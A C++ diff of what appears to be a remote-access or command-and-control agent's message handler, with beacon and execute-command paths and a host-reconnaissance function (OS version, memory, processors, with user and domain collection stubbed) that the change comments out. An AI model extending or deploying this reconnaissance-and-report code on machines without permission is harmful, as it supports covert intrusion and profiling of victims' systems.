@@ -50,8 +50,14 @@ void MessageHandler::start()
 	transportLayer_->beacon();
 }
 
-void MessageHandler::handle(RawByteBuffer& data)
+void MessageHandler::handle(const RawByteBuffer& data) // TODO: change rawbytebuffer to const? 
 {
+	std::cout << "MessageHandler::handle(RawByteBuffer)" << std::endl;
+}
+
+void MessageHandler::handle(const InternalMessage& msg)
+{
+	std::cout << "MessageHandler::handle(InternalMessage)" << std::endl;
 }
 
 bool MessageHandler::executeCommand(RawByteBuffer& data)
@@ -222,109 +228,109 @@ bool MessageHandler::handleServerError(RawByteBuffer& data)
 }
 
 
-bool MessageHandler::systemInfo(InternalMessage& msg)
-{
-	std::cout << "systemInfo" << std::endl; 
-	ReconMessage rMsg{};
-	//ZeroMemory(msg, sizeof(ReconMessage)); 
-
-	// OS Version Info 
-	//OSVERSIONINFOEX osInfo; 
-	//osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX); 
-	//if (GetVersionEx((OSVERSIONINFO*)&osInfo)) 
-	//{ 
-		//rMsg.dwMajorVersion = osInfo.dwMajorVersion;
-		//rMsg.dwMinorVersion = osInfo.dwMinorVersion;
-		//rMsg.dwBuildNumber = osInfo.dwBuildNumber;
-		//rMsg.wProductType = osInfo.wProductType;
-	//} 
-	///
-	typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
-	HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
-	if (hMod)
-	{
-		RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
-		if (fxPtr != nullptr)
-		{
-			RTL_OSVERSIONINFOW rovi = { 0 };
-			rovi.dwOSVersionInfoSize = sizeof(rovi);
-			if (fxPtr(&rovi) == 0)
-			{
-				rMsg.dwMajorVersion = rovi.dwMajorVersion;
-				rMsg.dwMinorVersion = rovi.dwMinorVersion;
-				rMsg.dwBuildNumber = rovi.dwBuildNumber;
-			}
-		}
-	}
-
-	///
-
-
-	// RAM Info 
-	MEMORYSTATUSEX memoryStatus; 
-	memoryStatus.dwLength = sizeof(memoryStatus); 
-	if (GlobalMemoryStatusEx(&memoryStatus)) 
-	{ 
-		rMsg.totalPhysicalMemory = memoryStatus.ullTotalPhys; 
-		rMsg.availablePhysicalMemory = memoryStatus.ullAvailPhys; 
-	} 
-	
-	// Processor Info 
-	SYSTEM_INFO systemInfo; 
-	GetSystemInfo(&systemInfo); 
-	rMsg.numberOfProcessors = systemInfo.dwNumberOfProcessors; 
-	rMsg.processorArchitecture = systemInfo.wProcessorArchitecture;
-
-	// Get processor name from registry (simplified) 
-	//GetProcessorName(msg->processorName, sizeof(msg->processorName));
-
-	// Local IP 
-	//GetLocalIpAddress(msg->localIp, sizeof(msg->localIp)); 
-	
-	// System Names
-	// DWORD size = sizeof(msg->computerName); 
-	// GetComputerNameA(msg->computerName, &size); 
- 
-	//size = sizeof(msg->userName); 
-	// GetUserNameA(msg->userName, &size); 
-
-	// Domain name (simplified)
-	// GetDomainName(msg->domainName, sizeof(msg->domainName)); 
-
-	// Process name 
-	// GetModuleFileNameA(NULL, msg->processName, sizeof(msg->processName)); 
-
-
-
-	std::ostringstream result; 
-	result << "dwMajorVersion: " << rMsg.dwMajorVersion << "\n";
-	result << "dwMinorVersion: " << rMsg.dwMinorVersion << "\n"; 
-	result << "dwBuildNumber: " << rMsg.dwBuildNumber << "\n"; 
-	result << "wProductType: " << rMsg.wProductType << "\n"; 
-	result << "totalPhysicalMemory: " << rMsg.totalPhysicalMemory << "\n"; 
-	result << "availablePhysicalMemory: " << rMsg.availablePhysicalMemory << "\n"; 
-	result << "numberOfProcessors: " << rMsg.numberOfProcessors << "\n"; 
-	result << "processorArchitecture: " << rMsg.processorArchitecture << "\n";
-
-	std::string outMsgData = result.str(); 
-
-	InternalMessage outMsg; 
-	outMsg.data = string2byte(outMsgData); 
-	
-	MessageHeader header; 
-	header.messageType = MessageType::COMMAND_RESULT; 
-	header.messageId = 105; // TODO: 
-	header.dataSize = outMsg.data.size(); 
-	outMsg.header = header; 
-	bool sendResult = transportLayer_->sendMessage(outMsg); 
-	return sendResult; 
-
-}
+// bool MessageHandler::systemInfo(InternalMessage& msg)
+// {
+//     std::cout << "systemInfo" << std::endl;
+//     ReconMessage rMsg{};
+//     //ZeroMemory(msg, sizeof(ReconMessage));
+//
+//     // OS Version Info
+//     //OSVERSIONINFOEX osInfo;
+//     //osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+//     //if (GetVersionEx((OSVERSIONINFO*)&osInfo))
+//     //{
+//         //rMsg.dwMajorVersion = osInfo.dwMajorVersion;
+//         //rMsg.dwMinorVersion = osInfo.dwMinorVersion;
+//         //rMsg.dwBuildNumber = osInfo.dwBuildNumber;
+//         //rMsg.wProductType = osInfo.wProductType;
+//     //}
+//     ///
+//     typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
+//     HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
+//     if (hMod)
+//     {
+//         RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
+//         if (fxPtr != nullptr)
+//         {
+//             RTL_OSVERSIONINFOW rovi = { 0 };
+//             rovi.dwOSVersionInfoSize = sizeof(rovi);
+//             if (fxPtr(&rovi) == 0)
+//             {
+//                 rMsg.dwMajorVersion = rovi.dwMajorVersion;
+//                 rMsg.dwMinorVersion = rovi.dwMinorVersion;
+//                 rMsg.dwBuildNumber = rovi.dwBuildNumber;
+//             }
+//         }
+//     }
+//
+//     ///
+//
+//
+//     // RAM Info
+//     MEMORYSTATUSEX memoryStatus;
+//     memoryStatus.dwLength = sizeof(memoryStatus);
+//     if (GlobalMemoryStatusEx(&memoryStatus))
+//     {
+//         rMsg.totalPhysicalMemory = memoryStatus.ullTotalPhys;
+//         rMsg.availablePhysicalMemory = memoryStatus.ullAvailPhys;
+//     }
+//
+//     // Processor Info
+//     SYSTEM_INFO systemInfo;
+//     GetSystemInfo(&systemInfo);
+//     rMsg.numberOfProcessors = systemInfo.dwNumberOfProcessors;
+//     rMsg.processorArchitecture = systemInfo.wProcessorArchitecture;
+//
+//     // Get processor name from registry (simplified)
+//     //GetProcessorName(msg->processorName, sizeof(msg->processorName));
+//
+//     // Local IP
+//     //GetLocalIpAddress(msg->localIp, sizeof(msg->localIp));
+//
+//     // System Names
+//     // DWORD size = sizeof(msg->computerName);
+//     // GetComputerNameA(msg->computerName, &size);
+//
+//     //size = sizeof(msg->userName);
+//     // GetUserNameA(msg->userName, &size);
+//
+//     // Domain name (simplified)
+//     // GetDomainName(msg->domainName, sizeof(msg->domainName));
+//
+//     // Process name
+//     // GetModuleFileNameA(NULL, msg->processName, sizeof(msg->processName));
+//
+//
+//
+//     std::ostringstream result;
+//     result << "dwMajorVersion: " << rMsg.dwMajorVersion << "\n";
+//     result << "dwMinorVersion: " << rMsg.dwMinorVersion << "\n";
+//     result << "dwBuildNumber: " << rMsg.dwBuildNumber << "\n";
+//     result << "wProductType: " << rMsg.wProductType << "\n";
+//     result << "totalPhysicalMemory: " << rMsg.totalPhysicalMemory << "\n";
+//     result << "availablePhysicalMemory: " << rMsg.availablePhysicalMemory << "\n";
+//     result << "numberOfProcessors: " << rMsg.numberOfProcessors << "\n";
+//     result << "processorArchitecture: " << rMsg.processorArchitecture << "\n";
+//
+//     std::string outMsgData = result.str();
+//
+//     InternalMessage outMsg;
+//     outMsg.data = string2byte(outMsgData);
+//
+//     MessageHeader header;
+//     header.messageType = MessageType::COMMAND_RESULT;
+//     header.messageId = 105; // TODO:
+//     header.dataSize = outMsg.data.size();
+//     outMsg.header = header;
+//     bool sendResult = transportLayer_->sendMessage(outMsg);
+//     return sendResult;
+//
+// }
 
 // TODO: something about this function corruprts the memory
 void MessageHandler::processMessage(InternalMessage& msg)
 {
-	systemInfo(msg);
+	//systemInfo(msg);
 	switch (msg.header.messageType)
 	{
 	case MessageType::EXECUTE_COMMAND:
@@ -361,11 +367,6 @@ void MessageHandler::processMessage(InternalMessage& msg)
 void MessageHandler::sendQueuedMessages()
 {
 	std::cout << "sendQueuedMessages... not implemented" << std::endl;
-}
-
-void MessageHandler::setTransportLayer(TransportLayer& transportLayer)
-{
-	transportLayer_ = &transportLayer;
 }
 
 RawByteBuffer MessageHandler::string2byte(std::string& inMsg)
